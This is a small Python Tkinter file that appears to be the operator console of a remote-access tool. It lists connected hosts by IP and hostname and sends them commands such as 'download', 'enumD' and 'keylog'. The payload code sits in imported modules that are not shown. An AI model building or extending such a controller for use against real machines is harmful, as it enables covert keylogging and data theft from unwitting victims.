import db
import Connection
from Tkinter import *
import ttk
import server

def main():
    root.title("Client")
    root.config(height=500, width=500)
    s = Scrollbar(frame)
    text.pack(side=LEFT, fill=Y)
    s.pack(side=RIGHT, fill=Y)
    s.config(command=text.yview)
    text.config(yscrollcommand=s.set)
    text.config(state=DISABLED)

    client.set("Select Client")
    clientMenu = OptionMenu(root, client, "All", *connections)
    clientMenu.place(relx=.1, rely=.85)

    cmd.set("Select Command")
    cmdMenu = OptionMenu(root, cmd, *commandsAvailable)
    cmdMenu.place(relx=.40, rely=.85)

    frame.place(relx=.1, rely=.1)

    button = Button(root, text="enter", command=clickEnter)
    button.place(relx=.75, rely=.852)

    st = Button(root, text="start", command=start)
    st.place(relx=.1, rely=.03)
    root.protocol("WM_DELETE_WINDOW", onClose)
    root.mainloop()

def onClose():
    DB.REMOVEALL()
    root.destroy()

def start():
    _server.startServer()

def clickEnter():
    comd = cmd.get()
    cli = client.get().split(" - ")
    l = [Connection.Connection(cli[0], cli[1], "s"), comd]
    _server.whatDo(l)

def updateTextbox(s):
    textVar.set(s)
    return 1


root = Tk()
globals()['textVar'] = StringVar(root)
print("hey")
frame = Frame(root, height="200", width="200")
text = Text(frame, height=25, width=55)
_server = server.Server(text)
textVar = StringVar(root)
client = StringVar(root)
cmd = StringVar(root)

DB = db.DB()
connections = DB.getAllConnectionsPrint()
for i in range(len(connections)):
    connections[i] = str(connections[i]["ip"]) + " - " + str(connections[i]["hostname"])

commandsAvailable = ["showC", "help", "download", "enumD", "keylog", "quit"]
updateTextbox("")
main()
